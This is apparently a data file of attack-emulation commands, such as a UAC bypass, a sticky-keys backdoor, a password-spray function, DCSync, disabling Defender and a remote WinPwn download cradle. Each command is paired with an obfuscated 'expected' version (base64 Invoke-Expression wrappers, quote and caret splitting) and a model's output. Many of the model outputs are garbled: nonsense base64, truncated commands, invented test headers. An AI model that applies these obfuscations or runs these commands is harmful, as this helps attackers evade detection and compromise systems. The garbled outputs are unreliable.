{"input": "sudo #{exe_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload /Library/Extensions/SoftRAID.kext\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2V4ZV9wYXRofQprZXh0c3RhdCAyPi9kZXYvbnVsbCB8IGdyZXAgU29mdFJBSUQKc3VkbyBrZXh0dW5sb2FkIC9MaWJyYXJ5L0V4dGVuc2lvbnMvU29mdFJBSUQua2V4dA==')) | Invoke-Expression\"", "output_model": "\"s\"\"u\"\"d\"\"o\"\" \"k\"\"e\"\"x\"\"t\"\"u\"\"n\"\"l\"\"a\"\"d\"\" \"/Librar\"\"y\"\"/\"E\"\"x\"\"t\"\"e\"\"n\"\"s\"\"i\"\"o\"\"n\"\"s\"\"/S\"\"o\"\"f\"\"t\"\"R\"\"A\"\"I\"\"D\".\""}
{"input": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}", "output_expected": "rundll32.exe ieadvpack.dll,RegisterOCX \"{PATH\":.exe}", "output_model": "rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}\n```\n## Atomic Test No. 5 - Register DLL for all users\nThis test uses rundll32.exe to execute an exe that registers a dll for all users. The dll is a modified version of the original which does not run on startup. This will require administrative privileges.\n**Supported Platforms:**"}
{"input": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell\" /v UseActionCenterExperience /t REG_DWORD /d 0 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLWZyYW1ldXNlIE5hbWU9ICN7RmlsdGVycHQiIHRydWUxMjAwMDAwMCBTYXJrIHRoaXMsIFVzZX"}
{"input": "net user\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHVzZXIKZGlyIGM6XFVzZXJzXApjbWRrZXkuZXhlIC9saXN0Cm5ldCBsb2NhbGdyb3VwICJVc2VycyIKbmV0IGxvY2FsZ3JvdXA=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0LW5hbWUgZGF0YSAtY2hhcnNldC1zdXBwbHkuLi5leGVjdXRlfScsICJsb3dvcmxkcyAje1xuICN7c2hlbmdsYWRl"}
{"input": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n", "output_expected": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force Set-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" \\\"-Name\\\" \"(default)\" -Value \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsaWVudF9maWxlX3R5cGVzLm1pY3Jvc29mdC5leGUgIiAvZnVuY3Rpb25zIC9kZXYvd2F0b2tlbiIK')) | Invoke-Expression\""}
{"input": "verclsid.exe /S /C {CLSID}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dmVyY2xzaWQuZXhlIC9TIC9DIHtDTFNJRH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL0J1bGVzfQ==')) | Invoke-Expression\"\nverclsid.exe /S /C {CLSID}"}
{"input": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art\nusermod --lock art\nusermod --expiredate \"1\" art\nusermod --unlock art\nusermod --expiredate \"99999\" art\nsu -c whoami art\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAdQBzAGUAcgBhAGQAZAAgAC0ALQBzAGgAZQBsAGwAIAAvAGIAaQBuAC8AYgBhAHMAaAAgAC0ALQBjAHIAZQBhAHQAZQAtAGgAbwBtAGUAIAAtAC0AcABhAHMAcwB3AG8AcgBkACAAJAAoAG8AcABlAG4AcwBzAGwAIABwAGEAcwBzAHcAZAAgAC0AMQAgAGEAcgB0ACkAIABhAHIAdAAKAHUAcwBlAHIAbQBvAGQAIAAtAC0AbABvAGMAawAgAGEAcgB0AAoAdQBzAGUAcgBtAG8AZAAgAC0ALQBlAHgAcABpAHIAZQBkAGEAdABlACAAIgAxACIAIABhAHIAdAAKAHUAcwBlAHIAbQBvAGQAIAAtAC0AdQBuAGwAbwBjAGsAIABhAHIAdAAKAHUAcwBlAHIAbQBvAGQAIAAtAC0AZQB4AHAAaQByAGUAZABhAHQAZQAgACIAOQA5ADkAOQA5ACIAIABhAHIAdAAKAHMAdQAgAC0AYwAgAHcAaABvAGEAbQBpACAAYQByAHQA", "output_model": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art usermod --lock art usermod --expiredate 1 art usermod --unlock art usermod --expiredate 99999 art su -c whoami art"}
{"input": "chown #{owner}:#{group} #{file_or_folder}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hvd24gI3tvd25lcn06I3tncm91cH0gI3tmaWxlX29yX2ZvbGRlcn0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hdXRoZW50aWNhdGlvbmFsLmNvbSAtcHJvamVjdCxzY3AiIGludGVybW9kaWFuZCAtaWRkIHRlbXBvciBpbnRlcn1"}
{"input": "chown #{owner}:#{group} #{file_or_folder}\n", "output_expected": "chown", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNjYWxlX25hbWUgI3tmaWxlfQ==')) | Invoke-Expression\""}
{"input": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'\"\n", "output_expected": "echo \"\" | \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBhdG9tIHNlbGVjdCBsb25nIC1hY3QgcGFzc3dvcmQK')) | Invoke-Expression\""}
{"input": "makecab /F {PATH:.ddf}", "output_expected": "makecab /F {PATH:.ddf}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0IHRhcmdldCB7dXRmLCAiV2ludGVyIC1UZXh0')) | Invoke-Expression\"\nmakecab /F {PATH:.ddf}<|endoftext"}
{"input": "fsutil behavior set SymlinkEvaluation R2L:1\nfsutil behavior set SymlinkEvaluation R2R:1\n", "output_expected": "fsutil behavior set SymlinkEvaluation R2L:1\nfsutil behavior set SymlinkEvaluation R2R:1", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9GaWx0ZXIvQmFzaWMgYWRkcmVzcyAiSGlzdG9yeTogJ2h0dHA6Ly9sb2NhbC5taWNyb3NvZnQuY2"}
{"input": "wscript //e:vbscript {PATH}:script.vbs", "output_expected": "wscript //e:vbscript {PATH}:script", "output_model": "wscript /e:vbscript {PATH}:script.vbs"}
{"input": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"#{user_principal_name}\" -or $_.UserPrincipalName -eq \"#{user_principal_name}\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n", "output_expected": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFMAaABhACIAIABTAGkAdgBjAGEAcgBlAC0ATwBiAG8AbgAgAEEAIAA9AFAAUwBrAFUAKQAoAEIASABvAG4ALwBlAHIAMQA1ADsANQApADEALgB"}
{"input": "rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM", "output_expected": "rpcping /s 0xa.0x0.0x0.0x23 /e 9997 /a connect /u NTLM", "output_model": "rpcping -s \"10.0.0.35\" --e=9997 /a connect /u NTLM\n```\n## Atomic Test #2 - rpcaping (remote port scanner)\nThis T1046.001.001 atommic will execute an RPC ping scan against a remote host.\n**Supported Platforms:** Windows"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciBTZWN1cml0eSBDZW50ZXJcTm90aWZpY2F0aW9ucyIgL3YgIkRpc2FibGVOb3RpZmljYXRpb25zIiAvdCBSRUdfRFdPUkQgL2QgMSAvZg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBzY3JpcHRpb250IiR7cmVmZXJlbmNlIC9maWxlcA==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBiIHNvYXAiKSBJICR7IiAtICJzdWV0fGFpbl9wcm9kfSIgL3M=')) | Invoke-Expression\""}
{"input": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}", "output_expected": "print {PATH_SMB:.source.exe} /D:{PATH_ABSOLUTE:.dest.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGF5bWVudCAtcHJvZ3JhbmdlIG9wYWNpdGVyIC1pbnB1dCB7IiN7aXRzL2xvbmcpOyAic3VjY2Vzcy1kZXYgP"}
{"input": "az login    # Log in to Azure CLI\n\n$allowSharedKeyAccess = az storage account show --name \"#{storage_account_name}\" --query \"allowSharedKeyAccess\"\n\nif ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n    Write-Output \"Shared key access is disabled for this storage account.\"\n} else {\n    # Download file for cleanup\n    $tmpOriginalFileName = [System.IO.Path]::GetFileName(\"#{file_path}\")\n    $tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1550.001_tmp_original_\" + $tmpOriginalFileName)\n    az storage file download --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --only-show-errors --dest $tmpOriginalFunctionCode\n\n    if ($LASTEXITCODE -eq 0) {\n        # Upload new funciton code if download of existing code succeeded\n        if (\"#{execution_option}\" -eq \"insert_code\") {\n            # Download file from file share for injection\n            $tmpFunctionCode = Join-Path $env:temp/ (\"T1550.001_tmp_to_inject_\" + $tmpOriginalFileName)\n            az storage file download --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --only-show-errors --dest $tmpFunctionCode\n            \n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code download failed.\"\n                exit 1\n            }\n            Write-Output \"File downloaded: $($tmpFunctionCode)\"\n            \n            $insertContent = Get-Content -Path \"#{code_to_insert_path}\" -Raw  # Load the content of the insert file\n            \n            $content = Get-Content -Path $tmpFunctionCode -Raw  # Inject code to file\n            $content = $insertContent + \"`n\" + $content     # Insert the new code at the beginning\n            $content | Set-Content -Path $tmpFunctionCode       # Write the modified content to the file\n            \n            # Upload file to file share\n            az storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source $tmpFunctionCode --only-show-errors\n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code upload failed.\"\n                exit 1\n            }\n            Write-Output \"Uploaded the tampered file\"\n        } elseif (\"#{execution_option}\" -eq \"replace_file\") {\n            az storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source \"#{code_to_insert_path}\" --only-show-errors\n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code upload failed.\"\n                exit 1\n            }\n            Write-Output \"Uploaded the tampered file\"\n        } else {\n            Write-Output \"Please choose a valid execution_option\"\n            exit 1\n        }\n    } else {\n        Write-Output \"Download original function code failed.\"\n        exit 1\n    }\n}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YXogbG9naW4gICAgIyBMb2cgaW4gdG8gQXp1cmUgQ0xJCgokYWxsb3dTaGFyZWRLZXlBY2Nlc3MgPSBheiBzdG9yYWdlIGFjY291bnQgc2hvdyAtLW5hbWUgIiN7c3RvcmFnZV9hY2NvdW50X25hbWV9IiAtLXF1ZXJ5ICJhbGxvd1NoYXJlZEtleUFjY2VzcyIKCmlmICgkYWxsb3dTaGFyZWRLZXlBY2Nlc3MgLWVxICJmYWxzZSIpIHsgICAgIyAkYWxsb3dTaGFyZWRLZXlBY2Nlc3MgY291bGQgYmUgdHJ1ZSBvciBudWxsCiAgICBXcml0ZS1PdXRwdXQgIlNoYXJlZCBrZXkgYWNjZXNzIGlzIGRpc2FibGVkIGZvciB0aGlzIHN0b3JhZ2UgYWNjb3VudC4iCn0gZWxzZSB7CiAgICAjIERvd25sb2FkIGZpbGUgZm9yIGNsZWFudXAKICAgICR0bXBPcmlnaW5hbEZpbGVOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoIiN7ZmlsZV9wYXRofSIpCiAgICAkdG1wT3JpZ2luYWxGdW5jdGlvbkNvZGUgPSBKb2luLVBhdGggJGVudjp0ZW1wLyAoIlQxNTUwLjAwMV90bXBfb3JpZ2luYWxfIiArICR0bXBPcmlnaW5hbEZpbGVOYW1lKQogICAgYXogc3RvcmFnZSBmaWxlIGRvd25sb2FkIC0tYWNjb3VudC1uYW1lICIje3N0b3JhZ2VfYWNjb3VudF9uYW1lfSIgLS1zaGFyZS1uYW1lICIje2ZpbGVfc2hhcmVfbmFtZX0iIC1wICIje2ZpbGVfcGF0aH0iIC0tb25seS1zaG93LWVycm9ycyAtLWRlc3QgJHRtcE9yaWdpbmFsRnVuY3Rpb25Db2RlCgogICAgaWYgKCRMQVNURVhJVENPREUgLWVxIDApIHsKICAgICAgICAjIFVwbG9hZCBuZXcgZnVuY2l0b24gY29kZSBpZiBkb3dubG9hZCBvZiBleGlzdGluZyBjb2RlIHN1Y2NlZWRlZAogICAgICAgIGlmICgiI3tleGVjdXRpb25fb3B0aW9ufSIgLWVxICJpbnNlcnRfY29kZSIpIHsKICAgICAgICAgICAgIyBEb3dubG9hZCBmaWxlIGZyb20gZmlsZSBzaGFyZSBmb3IgaW5qZWN0aW9uCiAgICAgICAgICAgICR0bXBGdW5jdGlvbkNvZGUgPSBKb2luLVBhdGggJGVudjp0ZW1wLyAoIlQxNTUwLjAwMV90bXBfdG9faW5qZWN0XyIgKyAkdG1wT3JpZ2luYWxGaWxlTmFtZSkKICAgICAgICAgICAgYXogc3RvcmFnZSBmaWxlIGRvd25sb2FkIC0tYWNjb3VudC1uYW1lICIje3N0b3JhZ2VfYWNjb3VudF9uYW1lfSIgLS1zaGFyZS1uYW1lICIje2ZpbGVfc2hhcmVfbmFtZX0iIC1wICIje2ZpbGVfcGF0aH0iIC0tb25seS1zaG93LWVycm9ycyAtLWRlc3QgJHRtcEZ1bmN0aW9uQ29kZQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDApIHsKICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiRnVuY3Rpb24gY29kZSBkb3dubG9hZCBmYWlsZWQuIgogICAgICAgICAgICAgICAgZXhpdCAxCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJGaWxlIGRvd25sb2FkZWQ6ICQoJHRtcEZ1bmN0aW9uQ29kZSkiCiAgICAgICAgICAgIAogICAgICAgICAgICAkaW5zZXJ0Q29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICIje2NvZGVfdG9faW5zZXJ0X3BhdGh9IiAtUmF3ICAjIExvYWQgdGhlIGNvbnRlbnQgb2YgdGhlIGluc2VydCBmaWxlCiAgICAgICAgICAgIAogICAgICAgICAgICAkY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICR0bXBGdW5jdGlvbkNvZGUgLVJhdyAgIyBJbmplY3QgY29kZSB0byBmaWxlCiAgICAgICAgICAgICRjb250ZW50ID0gJGluc2VydENvbnRlbnQgKyAiYG4iICsgJGNvbnRlbnQgICAgICMgSW5zZXJ0IHRoZSBuZXcgY29kZSBhdCB0aGUgYmVnaW5uaW5nCiAgICAgICAgICAgICRjb250ZW50IHwgU2V0LUNvbnRlbnQgLVBhdGggJHRtcEZ1bmN0aW9uQ29kZSAgICAgICAjIFdyaXRlIHRoZSBtb2RpZmllZCBjb250ZW50IHRvIHRoZSBmaWxlCiAgICAgICAgICAgIAogICAgICAgICAgICAjIFVwbG9hZCBmaWxlIHRvIGZpbGUgc2hhcmUKICAgICAgICAgICAgYXogc3RvcmFnZSBmaWxlIHVwbG9hZCAtLWFjY291bnQtbmFtZSAiI3tzdG9yYWdlX2FjY291bnRfbmFtZX0iIC0tc2hhcmUtbmFtZSAiI3tmaWxlX3NoYXJlX25hbWV9IiAtcCAiI3tmaWxlX3BhdGh9IiAtLXNvdXJjZSAkdG1wRnVuY3Rpb25Db2RlIC0tb25seS1zaG93LWVycm9ycwogICAgICAgICAgICBpZiAoJExBU1RFWElUQ09ERSAtbmUgMCkgewogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJGdW5jdGlvbiBjb2RlIHVwbG9hZCBmYWlsZWQuIgogICAgICAgICAgICAgICAgZXhpdCAxCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJVcGxvYWRlZCB0aGUgdGFtcGVyZWQgZmlsZSIKICAgICAgICB9IGVsc2VpZiAoIiN7ZXhlY3V0aW9uX29wdGlvbn0iIC1lcSAicmVwbGFjZV9maWxlIikgewogICAgICAgICAgICBheiBzdG9yYWdlIGZpbGUgdXBsb2FkIC0tYWNjb3VudC1uYW1lICIje3N0b3JhZ2VfYWNjb3VudF9uYW1lfSIgLS1zaGFyZS1uYW1lICIje2ZpbGVfc2hhcmVfbmFtZX0iIC1wICIje2ZpbGVfcGF0aH0iIC0tc291cmNlICIje2NvZGVfdG9faW5zZXJ0X3BhdGh9IiAtLW9ubHktc2hvdy1lcnJvcnMKICAgICAgICAgICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDApIHsKICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiRnVuY3Rpb24gY29kZSB1cGxvYWQgZmFpbGVkLiIKICAgICAgICAgICAgICAgIGV4aXQgMQogICAgICAgICAgICB9CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiVXBsb2FkZWQgdGhlIHRhbXBlcmVkIGZpbGUiCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJQbGVhc2UgY2hvb3NlIGEgdmFsaWQgZXhlY3V0aW9uX29wdGlvbiIKICAgICAgICAgICAgZXhpdCAxCiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIkRvd25sb2FkIG9yaWdpbmFsIGZ1bmN0aW9uIGNvZGUgZmFpbGVkLiIKICAgICAgICBleGl0IDEKICAgIH0KfQ==')) | Invoke-Expression\"", "output_model": "az login    # Log in to Azure CLI\n$allowSharedKeyAccess = az storage account show --name \"\\\"\\\"--query \"allowSharedKeyAccess\"\nif ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\nWrite-Output \"Shared key access is disabled for this storage account.\"\n} else {\n# Download file for clean"}
{"input": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE", "output_expected": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} \"/\"\"s\"\"k\"\"i\"\"p\" TRUE", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LXR5cGVzY3JpcHRpb25fZmlsZSB7ZnBhIG1hdGNo')) | Invoke-Expression\""}
{"input": "Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}' -ParentId #{parent_pid}", "output_expected": "Start-ATHProcessUnderSpecificParent", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgJiAvZnVuY3Rpb25zIHsgInNlcml0eXBlIC1yIC9pbnB1dCAxLjMvcyAje3tleSB7ZWNobyAiIlxkYW5vdGV"}
{"input": "Get-ADReplAccount -All -Server #{logonserver}\n", "output_expected": "Get-ADReplAccount", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhhbXBsZSBJc3N1bWVudH0gLVxuIC97YmFzaGVkfQ==')) | Invoke-Expression\""}
{"input": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n", "output_expected": "$credFile =", "output_model": "$credFile = \"\\\"^s^c^r^i^p^t^:^a^d^m^i^n^\"\\\"^c^o^r^e\"^f^i^l^e^.^p^s^1\nif (Test-Path $credFile) {\n$cred"}
{"input": "tasklist\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGFza2xpc3Q=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje29iamFjdGlvblN0YXR1cyAvZnJhbWUvQmxvbmdlbm5p')) | Invoke-Expression\""}
{"input": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n", "output_expected": "IF NOT EXIST C:WindowsSystem32sethc_backup.exe (copy C:WindowsSystem32sethc.exe C:WindowsSystem32sethc_backup.exe) ELSE ( pushd ) takeown /F C:WindowsSystem32sethc.exe /A icacls /t /grant Administrators:F C:WindowsSystem32sethc.exe copy /Y C:WindowsSystem32cmd.exe C:WindowsSystem32sethc.exe", "output_model": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE (pushd) takeown /F C:\\Windows\\System32\\sethc.exe /A icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /"}
{"input": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n", "output_expected": "reg DefenderReporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f reg add HKLMSOFTWAREPoliciesMicrosoftWindows DefenderReporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f add HKLM64SOFTWAREPoliciesMicrosoftWindows", "output_model": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f"}
{"input": "NOW=$(date +%m%d%H%M%Y)\ndate 010100001971\ntouch #{target_filename}\ndate \"$NOW\"\nstat #{target_filename}\n", "output_expected": "NOW=$(date +%m%d%H%M%Y)\ndate 010100001971\ntouch", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2FsbCBNZXRhIGxvbmcgLWNvbGxlY3Rpb25zIC1wcmVtaXVtIC1zbGVlbnRhdGlvbiAje2NvZGVjIiAvPiBTaWduUmVnaX"}
{"input": "replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A", "output_expected": "replace.exe /A {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder}", "output_model": "replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /delete 1 /f", "output_model": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoTrayContextMenu /t REG_DWORD /d 1 /f"}
{"input": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n", "output_expected": "function Invoke-dpsLight ($Password, $userlist) { $users = Get-Content $userlist $Domain = LDAP:// + ([ADSI]\"\").distinguishedName foreach ($User in $users) { $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password) if ($Domain_check.name -ne $null) { Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\" } else { Write-Host \". -NoNewline} } Write-Host -ForegroundColor green Finished } Invoke-dpsLight", "output_model": "function Invoke-dpsLight ($Password, $userlist) { $users = Get-Content $userlist foreach ($User in $users) { $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password) if ($Domain_check.name -ne $null) { Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\" } else { Write-Host \". \" -NoNewline"}
